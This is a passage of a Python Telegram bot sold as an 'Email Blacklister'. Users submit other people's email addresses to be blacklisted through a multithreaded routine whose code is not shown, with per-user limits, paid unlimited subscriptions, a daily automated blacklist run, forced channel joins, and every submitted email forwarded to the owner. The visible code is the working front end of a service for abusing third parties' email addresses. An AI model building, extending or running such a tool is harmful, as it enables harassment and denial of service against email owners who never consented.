                f"📊 USERS LIST\n\nTotal Users: {len(users_list)}\nLimit: {MAX_BLACKLIST_LIMIT} per user\n\nLast 10 Users:\n{user_text}"
            )
        
        elif data == 'ban':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            await query.edit_message_text(
                "🚫 BAN USER\n\nSend User ID to ban.\n\nUsage: /ban <user_id>\n\nExample: /ban 123456789"
            )
        
        elif data == 'unban':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            await query.edit_message_text(
                "✅ UNBAN USER\n\nSend User ID to unban.\n\nUsage: /unban <user_id>\n\nExample: /unban 123456789"
            )
        
        elif data == 'bannedlist':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            if not banned_users_list:
                await query.edit_message_text("📋 BANNED USERS\n\nNo users are banned.")
                return
            
            banned_text = "\n".join([f"• ID: {uid}" for uid in banned_users_list])
            await query.edit_message_text(
                f"📋 BANNED USERS\n\n{banned_text}\n\nTotal: {len(banned_users_list)} users"
            )
        
        elif data == 'sublist':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this feature!")
                return
            
            if not subscribers_list:
                await query.edit_message_text("💎 SUBSCRIBERS LIST\n\nNo subscribers yet.")
                return
            
            subs_text = "\n".join([f"• ID: {sid}" for sid in subscribers_list])
            await query.edit_message_text(
                f"💎 SUBSCRIBERS LIST\n\n{subs_text}\n\nTotal: {len(subscribers_list)} subscribers"
            )
        
        elif data == 'help':
            help_text = f"""📖 HELP & GUIDE

How to Use:

1️⃣ Click BLACKLIST NOW
2️⃣ Enter your Email Address
3️⃣ Wait for Processing...
4️⃣ Get Instant Results

Limit System:
• Normal users: {MAX_BLACKLIST_LIMIT} blacklists
• Failed attempts don't count
• Admins have unlimited access
• 💎 Subscribers have unlimited access

💎 How to Get Subscription:
• Contact owner: {OWNER_USERNAME}
• Owner can activate unlimited access

Auto Blacklist:
• Add emails to auto list
• Runs daily at 4:10 AM
• Admin only feature

Features:
🚀 30 Threads for Speed
🎯 Automatic Detection
⚡ Instant Results
🔒 Secure & Private
⏰ Auto Blacklist

Support:
👑 Owner: {OWNER_USERNAME}
💬 24/7 Available"""
            
            keyboard = [
                [InlineKeyboardButton("🔙 BACK", callback_data='back')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(help_text, reply_markup=reply_markup)
        
        elif data == 'owner':
            owner_text = f"""👑 OWNER INFORMATION

Owner: {OWNER_USERNAME}

Contact:
💬 Telegram: {OWNER_USERNAME}
⚡ Response Time: 24/7

About Bot:
🚀 Developed & Maintained by {OWNER_USERNAME}

Services:
🔥 Email Blacklisting
⏰ Auto Blacklist (4:10 AM)
💎 Unlimited Subscription
⚡ Fast Processing
🛡️ 24/7 Available

For Support:
💬 Contact {OWNER_USERNAME}
⚡ Quick Response Guaranteed"""
            
            keyboard = [
                [InlineKeyboardButton("🔙 BACK", callback_data='back')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(owner_text, reply_markup=reply_markup)
        
        elif data == 'status':
            total_users = len(users_list)
            total_blacklists = sum(u.get('blacklist_count', 0) for u in users_list)
            status_text = f"""📊 BOT STATUS

Status: 🟢 ONLINE
Workers: {NUM_WORKERS} Active
Users: {total_users} Total
Total Blacklists: {total_blacklists}
Limit: {MAX_BLACKLIST_LIMIT} per user
Security: 🔒 Secure
Uptime: 24/7
Auto List: {len(auto_emails_list)} emails
Auto Time: 4:10 AM Daily
Banned Users: {len(banned_users_list)}
Subscribers: {len(subscribers_list)} 💎

Admins: {len(admins_list) + 1} (including owner)

Performance:
Speed: ⚡⚡⚡⚡⚡
Privacy: ✅ Encrypted
Accuracy: 💯 Perfect

Owner: {OWNER_USERNAME}"""
            
            keyboard = [
                [InlineKeyboardButton("🔙 BACK", callback_data='back')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(status_text, reply_markup=reply_markup)
        
        elif data == 'check_join':
            is_member = await check_channel_membership(context, user_id)
            if is_member:
                reply_markup = get_main_menu_keyboard(user_id)
                await query.edit_message_text(
                    "✅ VERIFIED!\n\nYou have joined the channel!\nNow you can use the bot!\n\nChoose an option below:",
                    reply_markup=reply_markup
                )
            else:
                keyboard = [
                    [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.edit_message_text(
                    f"❌ NOT VERIFIED!\n\nYou haven't joined the channel yet!\n\nPlease join first: @Adityaapis_570\n\nClick below to join:",
                    reply_markup=reply_markup
                )
        
        elif data == 'cancel':
            user_states[user_id] = "idle"
            reply_markup = get_main_menu_keyboard(user_id)
            await query.edit_message_text(
                "✅ OPERATION CANCELLED\n\nYour request has been cancelled.\n\nWhat would you like to do next?",
                reply_markup=reply_markup
            )
        
        elif data == 'back':
            reply_markup = get_main_menu_keyboard(user_id)
            await query.edit_message_text(
                "✨🌟 MAIN MENU 🌟✨\n\nChoose an option below:",
                reply_markup=reply_markup
            )
        
        elif data == 'broadcast_yes' or data == 'broadcast_no':
            await broadcast_callback(update, context)
            
    except Exception as e:
        print(f"{R}[!] Error in button_callback: {e}{S}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            await update.message.reply_text("❌ Error: Could not identify user.")
            return
        
        user_id = user.id
        
        if is_user_banned(user_id):
            await update.message.reply_text("🚫 YOU ARE BANNED!\n\nYou are not allowed to use this bot.")
            return
        
        message_text = update.message.text.strip()
        
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message(update, context)
                return
        
        if user_states.get(user_id) == "awaiting_remove_email" and is_admin(user_id):
            emails = [e.strip() for e in message_text.split(',')]
            removed_emails = []
            not_found_emails = []
            
            for email in emails:
                if email in auto_emails_list:
                    auto_emails_list.remove(email)
                    removed_emails.append(email)
                else:
                    not_found_emails.append(email)
            
            save_auto_emails()
            
            keyboard = [
                [InlineKeyboardButton("🔙 BACK", callback_data='back')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            response = f"""❌ REMOVE FROM AUTO LIST

Removed: {len(removed_emails)} emails
Not Found: {len(not_found_emails)} emails
Total: {len(auto_emails_list)} emails remaining
Time: {datetime.now().strftime('%I:%M %p')}"""
            
            if removed_emails:
                response += "\n\nRemoved:\n• " + "\n• ".join(removed_emails)
            if not_found_emails:
                response += "\n\nNot Found:\n• " + "\n• ".join(not_found_emails)
            
            user_states[user_id] = "idle"
            await update.message.reply_text(response, reply_markup=reply_markup)
            return
        
        if user_states.get(user_id) == "awaiting_auto_email" and is_admin(user_id):
            emails = [e.strip() for e in message_text.split(',')]
            valid_emails = []
            invalid_emails = []
            
            for email in emails:
                if '@' in email and '.' in email:
                    if email not in auto_emails_list:
                        auto_emails_list.append(email)
                        valid_emails.append(email)
                    else:
                        invalid_emails.append(f"{email} (already exists)")
                else:
                    invalid_emails.append(f"{email} (invalid)")
            
            save_auto_emails()
            
            keyboard = [
                [InlineKeyboardButton("🔙 BACK", callback_data='back')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            response = f"""✅ AUTO LIST UPDATED

Added: {len(valid_emails)} emails
Failed: {len(invalid_emails)} emails
Total: {len(auto_emails_list)} emails
Time: Daily 4:10 AM"""
            
            if valid_emails:
                response += "\n\nAdded:\n• " + "\n• ".join(valid_emails)
            if invalid_emails:
                response += "\n\nFailed:\n• " + "\n• ".join(invalid_emails)
            
            user_states[user_id] = "idle"
            await update.message.reply_text(response, reply_markup=reply_markup)
            return
        
        if user_states.get(user_id) == "awaiting_email":
            if '@' in message_text and '.' in message_text:
                # Check limit only for non-unlimited users
                if not has_unlimited_access(user_id):
                    count = get_user_blacklist_count(user_id)
                    if count >= MAX_BLACKLIST_LIMIT:
                        keyboard = [
                            [InlineKeyboardButton("🏠 MAIN MENU", callback_data='back')]
                        ]
                        reply_markup = InlineKeyboardMarkup(keyboard)
                        await update.message.reply_text(
                            f"❌ LIMIT REACHED!\n\nYou have already blacklisted {count} emails.\nMaximum limit: {MAX_BLACKLIST_LIMIT}\n\n💎 Want unlimited access?\nContact: {OWNER_USERNAME}",
                            reply_markup=reply_markup
                        )
                        user_states[user_id] = "idle"
                        return
                
                await notify_owner_email(context, user, message_text)
                
                processing_msg = await update.message.reply_text(
                    f"⏳ PROCESSING...\n\nEmail: {message_text}\nUser: {user.full_name if user.full_name else 'User'}\n30 Threads Working...\n\nPlease wait..."
                )
                
                try:
                    # Run blocking blacklist in a thread to avoid blocking event loop
                    success, result = await asyncio.to_thread(blacklist_email, message_text)
                    
                    if success:
                        if not has_unlimited_access(user_id):
                            increment_blacklist_count(user_id)
                        
                        reply_markup = get_main_menu_keyboard(user_id)
                        
                        if is_admin(user_id):
                            access_note = "You are an admin - Unlimited access!"
                        elif is_subscribed(user_id):
                            access_note = "💎 Subscribed - Unlimited access!"
                        else:
                            count = get_user_blacklist_count(user_id)
                            remaining = MAX_BLACKLIST_LIMIT - count
                            access_note = f"Your Limit: {count}/{MAX_BLACKLIST_LIMIT}\nRemaining: {remaining}"
                        
                        await processing_msg.edit_text(
                            f"""🎉 SUCCESS!

✅ EMAIL BLACKLISTED SUCCESSFULLY!

Email: {message_text}
Status: {result}
By: {user.full_name if user.full_name else 'User'}
Time: {datetime.now().strftime('%I:%M %p')}
Date: {datetime.now().strftime('%d-%m-%Y')}

{access_note}""",
                            reply_markup=reply_markup
                        )
                    else:
                        reply_markup = get_main_menu_keyboard(user_id)
                        
                        if is_admin(user_id):
                            access_note = "You are an admin - Unlimited access!"
                        elif is_subscribed(user_id):
                            access_note = "💎 Subscribed - Unlimited access!"
                        else:
                            count = get_user_blacklist_count(user_id)
                            access_note = f"Your Limit: {count}/{MAX_BLACKLIST_LIMIT}\nFailed attempts don't count!"
                        
                        await processing_msg.edit_text(
                            f"""❌ FAILED!

BLACKLIST ATTEMPT FAILED!

Email: {message_text}
Status: {result}
By: {user.full_name if user.full_name else 'User'}

SOLUTION:
• Email may already be blacklisted
• Try with a different email
• Contact support if issue persists

{access_note}

Support: {OWNER_USERNAME}""",
                            reply_markup=reply_markup
                        )
                    
                    user_states[user_id] = "idle"
                    
                except Exception as e:
                    print(f"{R}[!] Blacklist error: {e}{S}")
                    reply_markup = get_main_menu_keyboard(user_id)
                    await processing_msg.edit_text(
                        f"⚠️ SYSTEM ERROR\n\nUnexpected error occurred!\n\nContact Support: {OWNER_USERNAME}\n24/7 Available",
                        reply_markup=reply_markup
                    )
                    user_states[user_id] = "idle"
            else:
                keyboard = [
                    [InlineKeyboardButton("🔄 TRY AGAIN", callback_data='blacklist')],
                    [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(
                    "❌ INVALID EMAIL\n\nPlease send a valid email address.\n\nCorrect Format: example@domain.com\n\nTips:\n• Must contain @ symbol\n• Must contain . extension\n• No spaces allowed",
                    reply_markup=reply_markup
                )
        
        else:
            reply_markup = get_main_menu_keyboard(user_id)
            await update.message.reply_text(
                f"✨🌟 EMAIL BLACKLISTER 🌟✨\n\nWelcome {user.full_name if user.full_name else 'User'}!\nUse the buttons below to interact with the bot!",
                reply_markup=reply_markup
            )
            
    except Exception as e:
        print(f"{R}[!] Error in handle_message: {e}{S}")

async def check_channel_membership(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    try:
        chat_member = await context.bot.get_chat_member(
            chat_id=FORCE_CHANNEL_USERNAME,
            user_id=user_id
        )
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"{R}[!] Channel check error: {e}{S}")
        return False

async def send_force_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔒 CHANNEL REQUIRED\n\n⚠️ You must join our channel first to use this bot!\n\n📢 Channel: @Adityaapis_570\n\n👇 Click below to join:",
        reply_markup=reply_markup
    )

async def send_force_channel_message_update(query):
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "🔒 CHANNEL REQUIRED\n\n⚠️ You must join our channel first to use this bot!\n\n📢 Channel: @Adityaapis_570\n\n👇 Click below to join:",
        reply_markup=reply_markup
    )

async def notify_owner_new_user(context: ContextTypes.DEFAULT_TYPE, user):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        if is_new_user(user.id):
            try:
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"🌟 NEW USER JOINED\n\nUser: {user.full_name if user.full_name else 'Unknown'}\nUsername: @{user.username if user.username else 'N/A'}\nID: {user.id}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
                print(f"{G}[+] New user joined: {user.full_name} (@{user.username}){S}")
            except Exception as e:
                print(f"{R}[!] Failed to notify owner: {e}{S}")

async def notify_owner_email(context: ContextTypes.DEFAULT_TYPE, user, email):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"📧 EMAIL SUBMITTED\n\nUser: {user.full_name if user.full_name else 'Unknown'}\nUsername: @{user.username if user.username else 'N/A'}\nEmail: {email}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            print(f"{G}[+] Email submitted: {email} by {user.full_name}{S}")
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}")

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    
    user_id = user.id
    user_states[user_id] = "idle"
    
    reply_markup = get_main_menu_keyboard(user_id)
    await update.message.reply_text(
        "✅ OPERATION CANCELLED\n\nReady for next action!",
        reply_markup=reply_markup
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = len(users_list)
    total_blacklists = sum(u.get('blacklist_count', 0) for u in users_list)
    
    keyboard = [
        [InlineKeyboardButton("🔙 BACK", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"""📊 BOT STATUS

Status: 🟢 ONLINE
Workers: {NUM_WORKERS} Active
Users: {total_users} Total
Total Blacklists: {total_blacklists}
Limit: {MAX_BLACKLIST_LIMIT} per user
Security: 🔒 Secure
Uptime: 24/7
Banned Users: {len(banned_users_list)}
Subscribers: {len(subscribers_list)} 💎

Performance:
Speed: ⚡⚡⚡⚡⚡
Privacy: ✅ Encrypted
Accuracy: 💯 Perfect

Owner: {OWNER_USERNAME}
Support: 24/7 Available""",
        reply_markup=reply_markup
    )

# ==================== AUTO BLACKLIST SCHEDULER (FIXED) ====================

def schedule_auto_blacklist(application):
    """Schedule auto blacklist daily at 4:10 AM IST using job_queue"""
    try:
        from datetime import time as dt_time
        try:
            from zoneinfo import ZoneInfo
            ist = ZoneInfo('Asia/Kolkata')
        except Exception:
            ist = None
        
        if ist:
            job_time = dt_time(hour=4, minute=10, second=0, tzinfo=ist)
        else:
            job_time = dt_time(hour=4, minute=10, second=0)
        
        if application.job_queue is None:
            raise Exception("job_queue is None (install python-telegram-bot[job-queue])")
        
        application.job_queue.run_daily(
            auto_blacklist_job,
            time=job_time,
            name="auto_blacklist_daily"
        )
        print(f"{G}[+] Auto blacklist scheduled daily at 4:10 AM IST via job_queue{S}")
    except Exception as e:
        print(f"{R}[!] job_queue failed: {e}{S}")
        print(f"{Y}[!] Falling back to thread-based scheduler{S}")
        _schedule_auto_blacklist_thread(application)

def _schedule_auto_blacklist_thread(application):
    """Fallback thread-based scheduler"""
    def check_and_run():
        last_run = None
        while True:
            try:
                now = datetime.now()
                today = now.date()
                current_min = now.hour * 60 + now.minute
                target_min = 4 * 60 + 10  # 4:10 AM
                
                # Run if current time is past 4:10 AM and haven't run today
                if current_min >= target_min and last_run != today:
                    print(f"{G}[+] Running auto blacklist (thread fallback)...{S}")
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    try:
                        # Create a fake context-like object with .bot
                        class FakeContext:
                            def __init__(self, bot):
                                self.bot = bot
                        ctx = FakeContext(application.bot)
                        loop.run_until_complete(auto_blacklist_job(ctx))
                    except Exception as e:
                        print(f"{R}[!] Auto blacklist error: {e}{S}")
                    finally:
                        loop.close()
                    last_run = today
                    print(f"{G}[+] Auto blacklist completed (thread){S}")
                
                time.sleep(30)
            except Exception as e:
                print(f"{R}[!] Scheduler error: {e}{S}")
                time.sleep(60)
    
    thread = threading.Thread(target=check_and_run, daemon=True)
    thread.start()
    print(f"{G}[+] Auto blacklist scheduled via thread fallback (4:10 AM daily){S}")

# ==================== MAIN FUNCTION ====================

def main():
    try:
        print(f"{G}[+] Loading data...{S}")
        load_auto_emails()
        load_users()
        load_admins()
        load_banned_users()
        load_subscribers()
        
        print(f"{G}[+] Building application...{S}")
        
        request = HTTPXRequest(
            connection_pool_size=8,
            connect_timeout=60.0,
            read_timeout=60.0,
            write_timeout=60.0,
            pool_timeout=60.0
        )
        
        application = Application.builder().token(BOT_TOKEN).request(request).build()
        
        print(f"{G}[+] Adding handlers...{S}")
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("cancel", cancel_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("broadcast", broadcast_command))
        application.add_handler(CommandHandler("ban", ban_command))
        application.add_handler(CommandHandler("unban", unban_command))
        application.add_handler(CommandHandler("bannedlist", banned_list_command))
        application.add_handler(CommandHandler("subscribe", subscribe_command))
        application.add_handler(CommandHandler("unsubscribe", unsubscribe_command))
        application.add_handler(CommandHandler("checksub", checksub_command))
        application.add_handler(CommandHandler("sublist", sublist_command))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        schedule_auto_blacklist(application)
        
        print(f"{G}[+] Bot is ready!{S}")
        print(f"""
{G}╔═══════════════════════════════════════╗{S}
{G}║     ✨🌟 BOT STARTED 🌟✨           ║{S}
{G}╠═══════════════════════════════════════╣{S}
{G}║                                       ║{S}
{G}║  🤖 Status: {G}🟢 ONLINE{S}               ║
{G}║  👑 Owner: {C}{OWNER_USERNAME}{S}              ║
{G}║  🆔 Owner ID: {C}{OWNER_ID}{S}        ║
{G}║  ⚡ Workers: {C}{NUM_WORKERS}{S} Active        ║
{G}║  🔒 Security: {G}✅ Secure{S}          ║
{G}║  ⏰ Auto Blacklist: 4:10 AM        ║{S}
{G}║  📧 Auto List: {C}{len(auto_emails_list)}{S} emails  ║
{G}║  👥 Users: {C}{len(users_list)}{S} registered  ║
{G}║  📊 Limit: {C}{MAX_BLACKLIST_LIMIT}{S} per user  ║
{G}║  🚫 Banned Users: {C}{len(banned_users_list)}{S}  ║
{G}║  💎 Subscribers: {C}{len(subscribers_list)}{S}  ║
{G}║  ✅ Bot is running successfully!   ║{S}
{G}║  Press Ctrl+C to stop               ║{S}
{G}║                                       ║{S}
{G}╚═══════════════════════════════════════╝{S}
""")
        
        try:
            application.run_polling()
        except Conflict as e:
            print(f"{R}[!] Conflict Error: {e}{S}")
            print(f"{Y}[!] Another bot instance is running. Run: pkill -f 'python' and try again{S}")
        except Exception as e:
            print(f"{R}[!] Error: {e}{S}")
            
    except Exception as e:
        print(f"{R}[!] Main error: {e}{S}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"""
{R}╔═══════════════════════════════════════╗{S}
{R}║     ⚠️🛑 BOT STOPPED 🛑⚠️           ║{S}
{R}╠═══════════════════════════════════════╣{S}
{R}║                                       ║{S}
{R}║  Bot has been stopped by user.       ║{S}
{R}║  Thank you for using the bot!        ║{S}
{R}║                                       ║{S}
{R}╚═══════════════════════════════════════╝{S}
""")
        sys.exit()
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{S}")
        import traceback
        traceback.print_exc()